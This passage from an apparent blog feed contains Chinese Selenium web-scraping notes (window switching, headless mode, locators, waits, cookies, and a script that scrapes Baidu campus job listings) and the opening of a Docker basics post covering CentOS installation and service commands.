string">'./div[1]/div[1]/div[1]/a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    job_salary <span class="token operator">=</span> li<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'./div[1]/div[1]/div[2]/span'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    company <span class="token operator">=</span> li<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'./div[1]/div[2]/div[1]/a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span>company<span class="token punctuation">,</span> job_name<span class="token punctuation">,</span> job_salary<span class="token punctuation">)</span>web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="切换窗口方法1"><a href="#切换窗口方法1" class="headerlink" title="切换窗口方法1"></a>切换窗口方法1</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver <span class="token keyword">import</span> Chrome<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>keys <span class="token keyword">import</span> Keys<span class="token keyword">import</span> timeweb <span class="token operator">=</span> Chrome<span class="token punctuation">(</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.lagou.com/"</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="cboxClose"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="search_input"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">"python"</span><span class="token punctuation">,</span> Keys<span class="token punctuation">.</span>ENTER<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="jobList"]/div[1]/div[3]/div[1]/div[1]/div[1]/a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>switch_to<span class="token punctuation">.</span>window<span class="token punctuation">(</span>web<span class="token punctuation">.</span>window_handles<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>job_detail <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="job_detail"]/dd[2]/div'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>job_detail<span class="token punctuation">)</span>web<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>switch_to<span class="token punctuation">.</span>window<span class="token punctuation">(</span>web<span class="token punctuation">.</span>window_handles<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="切换窗口方法2-用于含有iframe标签的页面"><a href="#切换窗口方法2-用于含有iframe标签的页面" class="headerlink" title="切换窗口方法2(用于含有iframe标签的页面)"></a>切换窗口方法2(用于含有iframe标签的页面)</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://91kanju.com/vod-play/541-1-1.html"</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>iframe <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="player_iframe"]'</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>switch_to<span class="token punctuation">.</span>frame<span class="token punctuation">(</span>iframe<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>switch_to<span class="token punctuation">.</span>default_content<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="无头浏览器（即不显示出打开浏览器的过程，使其在后台运行）"><a href="#无头浏览器（即不显示出打开浏览器的过程，使其在后台运行）" class="headerlink" title="无头浏览器（即不显示出打开浏览器的过程，使其在后台运行）"></a>无头浏览器（即不显示出打开浏览器的过程，使其在后台运行）</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver <span class="token keyword">import</span> Chrome<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>select <span class="token keyword">import</span> Select<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>chrome<span class="token punctuation">.</span>options <span class="token keyword">import</span> Options<span class="token keyword">import</span> time<span class="token comment"># 无头配置</span>opt <span class="token operator">=</span> Options<span class="token punctuation">(</span><span class="token punctuation">)</span>opt<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--headless"</span><span class="token punctuation">)</span>opt<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-gpu"</span><span class="token punctuation">)</span>web <span class="token operator">=</span> Chrome<span class="token punctuation">(</span>options<span class="token operator">=</span>opt<span class="token punctuation">)</span>web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.endata.com.cn/BoxOffice/BO/Year/index.html"</span><span class="token punctuation">)</span><span class="token comment"># 下拉列表</span>sel_element <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="OptionDate"]'</span><span class="token punctuation">)</span>sel <span class="token operator">=</span> Select<span class="token punctuation">(</span>sel_element<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sel<span class="token punctuation">.</span>options<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sel<span class="token punctuation">.</span>select_by_index<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    table <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="TableList"]/table'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"========================="</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="当页面内容是通过js或者ajax请求获得的数据时，无法通过查看源代码获得数据，可通过web-page-source获得"><a href="#当页面内容是通过js或者ajax请求获得的数据时，无法通过查看源代码获得数据，可通过web-page-source获得" class="headerlink" title="当页面内容是通过js或者ajax请求获得的数据时，无法通过查看源代码获得数据，可通过web.page_source获得"></a>当页面内容是通过js或者ajax请求获得的数据时，无法通过查看源代码获得数据，可通过<code>web.page_source</code>获得</h5><h4 id="定位元素方式总结"><a href="#定位元素方式总结" class="headerlink" title="定位元素方式总结"></a>定位元素方式总结</h4><ol><li><p>```python<br>inputForm = web.find_element_by_id(‘kw’)<br>inputForm.send_keys(‘python’)</p><pre class="line-numbers language-none"><code class="language-none">2. &#96;&#96;&#96;python   inputForm &#x3D; web.find_element_by_name(&#39;wd&#39;)   inputForm.send_keys(&#39;python&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>```python<br>inputForm = web.find_element_by_class_name(‘cls’)<br>inputForm.send_keys(‘python’)</p><pre class="line-numbers language-none"><code class="language-none">4. &#96;&#96;&#96;python   inputForm &#x3D; web.find_element_by_xpath(&quot;&#x2F;&#x2F;input[@id&#x3D;&#39;kw&#39;]&quot;)   inputForm.send_keys(&#39;python&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>```python<br>inputForm = web.find_element_by_css_selector(“.quickdelete-wrap &gt; input”)<br>inputForm.send_keys(‘python’)</p><pre class="line-numbers language-none"><code class="language-none">&gt; &#96;find_element&#96; 获取第一个满足条件的元素，&#96;find_elements&#96;获取满足所有条件的元素#### 操作表单元素1. 操作输入框   &#96;&#96;&#96;python   inputForm &#x3D; web.find_element_by_id(&quot;kw&quot;)   inputForm.send_keys(&#39;python&#39;)   time.sleep(5)   # 清楚输入框内容   inputForm.clear()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>操作checkbox</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">checkbox <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_name<span class="token punctuation">(</span><span class="token string">"Fruit"</span><span class="token punctuation">)</span>checkbox<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>操作select</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>ui <span class="token keyword">import</span> Selectweb<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://code.ciaoca.com/jquery/cxSelect/demo/api"</span><span class="token punctuation">)</span>selectButton <span class="token operator">=</span> Select<span class="token punctuation">(</span>web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="city_china"]/dl[1]/dd/select[1]'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>selectButton<span class="token punctuation">.</span>select_by_index<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>selectButton<span class="token punctuation">.</span>select_by_value<span class="token punctuation">(</span><span class="token string">"内蒙古自治区"</span><span class="token punctuation">)</span>selectButton<span class="token punctuation">.</span>select_by_visible_text<span class="token punctuation">(</span><span class="token string">"吉林省"</span><span class="token punctuation">)</span>selectButton<span class="token punctuation">.</span>deselect_all<span class="token punctuation">(</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>操作Button</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">)</span>inputForm <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">'kw'</span><span class="token punctuation">)</span>inputForm<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">'python'</span><span class="token punctuation">)</span>submitButton <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">'su'</span><span class="token punctuation">)</span>submitButton<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="行为链"><a href="#行为链" class="headerlink" title="行为链"></a>行为链</h4><p>页面操作分为多步，可以使用鼠标行为链类<code>ActionChains</code>完成</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>action_chains <span class="token keyword">import</span> ActionChainsweb<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">)</span>inputForm <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">'kw'</span><span class="token punctuation">)</span>submitButton <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">'su'</span><span class="token punctuation">)</span>actions <span class="token operator">=</span> ActionChains<span class="token punctuation">(</span>web<span class="token punctuation">)</span>actions<span class="token punctuation">.</span>move_to_element<span class="token punctuation">(</span>inputForm<span class="token punctuation">)</span>actions<span class="token punctuation">.</span>send_keys_to_element<span class="token punctuation">(</span>inputForm<span class="token punctuation">,</span><span class="token string">'python'</span><span class="token punctuation">)</span>actions<span class="token punctuation">.</span>move_to_element<span class="token punctuation">(</span>submitButton<span class="token punctuation">)</span>actions<span class="token punctuation">.</span>click<span class="token punctuation">(</span>submitButton<span class="token punctuation">)</span>actions<span class="token punctuation">.</span>perform<span class="token punctuation">(</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>更多操作</p><ul><li>click_and_hold(element) 点击但不松开鼠标</li><li>context_click(element) 右键点击</li><li>double_click(element) 双击</li></ul><p>更多方法参考 <a href="https://selenium-python.readthedocs.io/api.html">https://selenium-python.readthedocs.io/api.html</a></p></blockquote><h4 id="操作cookie"><a href="#操作cookie" class="headerlink" title="操作cookie"></a>操作cookie</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 获取所有cookie</span><span class="token keyword">for</span> cookie <span class="token keyword">in</span> web<span class="token punctuation">.</span>get_cookies<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token comment"># 针对某个key获取value</span><span class="token keyword">print</span><span class="token punctuation">(</span>web<span class="token punctuation">.</span>get_cookie<span class="token punctuation">(</span><span class="token string">"PSTM"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 删除某个key对应的cookie</span>web<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span><span class="token string">"PSTM"</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>delete_all_cookies<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="页面等待"><a href="#页面等待" class="headerlink" title="页面等待"></a>页面等待</h4><p>隐式等待 - 调用<code>implicitly_wait</code>，在获取不可用的元素之前，会先等待一些时间</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">web<span class="token punctuation">.</span>implicitly_wait<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>显式等待 - 表明某个条件成立后才执行获取元素的操作，也可以在等待中指定一个最大的时间，如果超过这个时间，就会抛出异常。使用<code>selenium.webdriver.support.ui.WebDriverWait</code> 和 <code>selenium.webdriver.support.expected_conditions</code>配合完成</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>ui <span class="token keyword">import</span> WebDriverWait<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support <span class="token keyword">import</span> expected_conditions<span class="token keyword">try</span><span class="token punctuation">:</span>    element <span class="token operator">=</span> WebDriverWait<span class="token punctuation">(</span>web<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span>expected_conditions<span class="token punctuation">.</span>presence_of_element_located<span class="token punctuation">(</span><span class="token punctuation">(</span>By<span class="token punctuation">.</span>ID<span class="token punctuation">,</span> <span class="token string">"myelement"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">finally</span><span class="token punctuation">:</span>    web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="切换页面"><a href="#切换页面" class="headerlink" title="切换页面"></a>切换页面</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">)</span><span class="token comment"># 调用js语法打开新的页面</span>web<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">"window.open('https://www.douban.com/')"</span><span class="token punctuation">)</span><span class="token comment"># 切换到该页面中</span>web<span class="token punctuation">.</span>switch_to<span class="token punctuation">.</span>window<span class="token punctuation">(</span>web<span class="token punctuation">.</span>window_handles<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>web<span class="token punctuation">.</span>current_url<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriveroptions <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>ChromeOptions<span class="token punctuation">(</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--proxy-server=http://ip:port"</span><span class="token punctuation">)</span>web <span class="token operator">=</span> Chrome<span class="token punctuation">(</span>chrome_options<span class="token operator">=</span>options<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="保存页面截图"><a href="#保存页面截图" class="headerlink" title="保存页面截图"></a>保存页面截图</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">web<span class="token punctuation">.</span>save_screenshot<span class="token punctuation">(</span><span class="token string">'a.jpg'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="爬取百度校招职位"><a href="#爬取百度校招职位" class="headerlink" title="爬取百度校招职位"></a>爬取百度校招职位</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>ui <span class="token keyword">import</span> WebDriverWait<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support <span class="token keyword">import</span> expected_conditionsdriver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"https://talent.baidu.com/external/baidu/campus.html#/jobList"</span>driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    div <span class="token operator">=</span> WebDriverWait<span class="token punctuation">(</span>driver<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span>        expected_conditions<span class="token punctuation">.</span>presence_of_element_located<span class="token punctuation">(</span>            <span class="token punctuation">(</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span> <span class="token string">'//*[@id="campus-job-list"]/div/div[2]/div[1]/div/div[2]'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span>    list_row <span class="token operator">=</span> div<span class="token punctuation">.</span>find_elements_by_class_name<span class="token punctuation">(</span><span class="token string">'list-row'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> each <span class="token keyword">in</span> list_row<span class="token punctuation">:</span>        a_element <span class="token operator">=</span> each<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'./div[1]/a'</span><span class="token punctuation">)</span>        job_link <span class="token operator">=</span> a_element<span class="token punctuation">.</span>get_property<span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">)</span>        job_name <span class="token operator">=</span> a_element<span class="token punctuation">.</span>text        <span class="token keyword">print</span><span class="token punctuation">(</span>job_link<span class="token operator">+</span><span class="token string">" - "</span><span class="token operator">+</span>job_name<span class="token punctuation">)</span><span class="token keyword">finally</span><span class="token punctuation">:</span>    driver<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning_Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> spider </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker基础</title>
      <link href="/2021/07/29/Docker%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/07/29/Docker%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>关于Docker的一些基础知识及部署命令</p><h2 id="documents-and-library"><a href="#documents-and-library" class="headerlink" title="documents and library"></a>documents and library</h2><p><code>https://docs.docker.com/</code></p><p><code>https://hub.docker.com/</code></p><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p>Docker needs the version of CentOS kernel &gt; <code>3.10</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[ezy@localhost ~]$ uname -r3.10.0-693.el7.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost ezy]# yum install -y yum-utils device-mapper-persistent-data lvm2[root@localhost ezy]# yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo[root@localhost ezy]# yum install docker-ce docker-ce-cli containerd.io[root@localhost ezy]# systemctl start docker # start docker[root@localhost ezy]# systemctl enable docker #设置开机启动Created symlink from &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;multi-user.target.wants&#x2F;docker.service to &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;docker.service.[root@localhost ezy]# docker versionClient: Docker Engine - Community Version:           19.03.13 API version:       1.40 Go version:        go1.13.15 Git commit:        4484c46d9d Built:             Wed Sep 16 17:03:45 2020 OS&#x2F;Arch:           linux&#x2F;amd64 Experimental:      falseServer: Docker Engine - Community Engine:  Version:          19.03.13  API version:      1.40 (minimum version 1.12)  Go version:       go1.13.15  Git commit:       4484c46d9d  Built:            Wed Sep 16 17:02:21 2020  OS&#x2F;Arch:          linux&#x2F;amd64  Experimental:     false containerd:  Version:          1.3.7  GitCommit:        8fba4e9a7d01810a393d5d25a3621dc101981175 runc:  Version:          1.0.0-rc10  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd docker-init:  Version:          0.18.0  GitCommit:        fec3683<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Docker-HelloWorld-test"><a href="#Docker-HelloWorld-test" class="headerlink" title="Docker HelloWorld test"></a>Docker HelloWorld test</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost ezy]# docker run hello-worldUnable to find image &#39;hello-world:latest&#39; locallylatest: Pulling from library&#x2F;hello-world0e03bdcc26d7: Pull complete Digest: sha256:8c5aeeb6a5f3ba4883347d3747a7249f491766ca1caa47e5da5dfcf6b9b717c0Status: Downloaded newer image for hello-world:latestHello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.    (amd64) 3. The Docker daemon created a new container from that image which runs the    executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it    to your terminal.To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bashShare images, automate workflows, and more with a free Docker ID: https:&#x2F;&#x2F;hub.docker.com&#x2F;For more examples and ideas, visit: https:&#x2F;&#x2F;docs.docker.com&#x2F;get-started&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="config-Aliyun-images-repositories-to-speed-up-downloading-images"><a href="#config-Aliyun-images-repositories-to-speed-up-downloading-images" class="headerlink" title="config Aliyun images repositories(to speed up downloading images)"></a>config Aliyun images repositories(to speed up downloading images)</h2><ol><li>Through logging into the Aliyun official website, enter into the container image service.</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/docker/docker-f1.png" alt="image-20201111221517543"></p><ol start="2"><li>create <code>daemon.json</code> file in the <code>/etc/docker</code>. </li></ol><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/docker/docker-f2.png" alt="image-20201111222029063"></p><ol start="3"><li><p>reboot daemon</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# systemctl daemon-reload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>reboot docker service</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>test</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/docker/docker-f3.png" alt="image-20201111222434755"></p></li></ol><h2 id="Basic-commands"><a href="#Basic-commands" class="headerlink" title="Basic commands"></a>Basic commands</h2><h4 id="start-stop-restart-docker"><a href="#start-stop-restart-docker" class="headerlink" title="start, stop, restart docker"></a>start, stop, restart docker</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# systemctl start docker[root@localhost docker]# systemctl stop docker[root@localhost docker]# systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="view-information"><a href="#view-information" class="headerlink" title="view information"></a>view information</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="check-help-documents"><a href="#check-help-documents" class="headerlink" title="check help documents"></a>check help documents</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[root@localhost docker]# docker --help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 